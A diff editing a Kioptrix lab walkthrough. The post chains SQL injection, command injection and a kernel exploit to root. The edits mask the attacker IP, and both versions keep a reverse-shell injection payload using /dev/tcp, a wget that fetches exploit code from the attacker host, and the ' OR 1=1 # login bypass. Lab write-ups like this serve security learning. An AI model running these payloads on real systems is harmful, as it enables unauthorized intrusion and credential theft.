@@ -69,7 +69,7 @@ nc -lvnp 4444
 Then in the ping field:
 
 ```
-127.0.0.1 | bash -i >& /dev/tcp/192.168.73.2/4444 0>&1
+127.0.0.1 | bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/4444 0>&1
 ```
 
 Quick breakdown of what that actually does. `127.0.0.1 |` pings localhost and the pipe sends the output to the next command. `bash -i` fires up an interactive shell. `>& /dev/tcp/IP/PORT` redirects both stdout and stderr over TCP to our Kali box. `0>&1` sends stdin through the same connection. End result is the target connects back to us with a full shell. That's why it's called a reverse shell, the target reaches out to us instead of us connecting to it.
@@ -110,7 +110,7 @@ On the Kioptrix shell, downloaded it to /tmp (one of the few places we can write
 
 ```bash
 cd /tmp
-wget http://192.168.73.2:8080/9542.c -O /tmp/9542.c
+wget http://xxx.xxx.xxx.xxx:8080/9542.c -O /tmp/9542.c
 gcc 9542.c -o exploit
 ./exploit
 ```
@@ -128,15 +128,15 @@ That's it. Root.
 
 I only went the web route this time (SQL injection into command injection into kernel exploit) but there's more stuff to poke at on this box.
 
-**MySQL on 3306** is open and could be worth connecting to directly. If it accepts remote connections with weak creds you could dump the database, grab password hashes, or even write files to disk with `SELECT INTO OUTFILE`.
+**MySQL on 3306** is open and could be worth connecting to directly. If it accepts remote connections with weak creds you could dump the database, grab password hashes, or even write files to disk.
 
 **SSH on 22** could be brute forced with hydra. Or if you get creds from the database dump you could just log in directly. Way cleaner than a reverse shell.
 
-**sqlmap** against the login form would be interesting too. Instead of just bypassing the login with `' OR 1=1 #` you could use sqlmap to fully enumerate the database, dump all tables, and extract every password hash. That gives you way more info than just getting past the login screen.
+**sqlmap** against the login form would be interesting too. Instead of just bypassing the login with `' OR 1=1 #` you could use sqlmap to fully enumerate the database, dump all tables, and extract creds.
 
 **gobuster** on the web server to find hidden directories and files. There might be admin panels, backup files, or other pages that aren't linked from the main site.
 
-**Other privilege escalation paths** besides the kernel exploit. Could check for SUID binaries with `find / -perm -4000`, look at cronjobs, check file permissions, or hunt for credentials in config files. There's usually more than one way to root.
+**Other privilege escalation paths** besides the kernel exploit. Could check for SUID binaries with `find / -perm -4000`, look at cronjobs, check file permissions, or hunt for credentials in config files.
 
 Will come back and hit these when I get the chance.
 
@@ -148,10 +148,10 @@ SQL injection on login forms is still one of the easiest wins out there. `' OR 1
 
 Command injection shows up anywhere user input gets passed to system commands. Ping forms, DNS lookups, file upload handlers. If it interacts with the OS, try pipes and semicolons.
 
-Reverse shells make way more sense to me now. It's just redirecting stdin, stdout, and stderr over a TCP connection. The `>&` means "both stdout and stderr" and `0>&1` chains stdin into the same pipe. The `&` in front of the number tells bash "this is a file descriptor, not a filename."
+Reverse shells make way more sense to me now. It's just redirecting stdin, stdout, and stderr over a TCP connection. The `>&` means "both stdout and stderr" and `0>&1` chains stdin into the same connection.
 
 Old kernels are free root. If you see a kernel version from 2006, searchsploit will almost certainly have something for it. Download, compile, run, done.
 
-Transferring files to a target is easiest with python's http server on your end and wget on the target. Just make sure you're running the server from the directory where the file actually is, otherwise you get a 404 and waste 10 minutes figuring out why.
+Transferring files to a target is easiest with python's http server on your end and wget on the target. Just make sure you're running the server from the directory where the file actually is, otherwise wget gets a 404.
 
 *Educational purposes only. Don't run any of this on systems you don't own.*
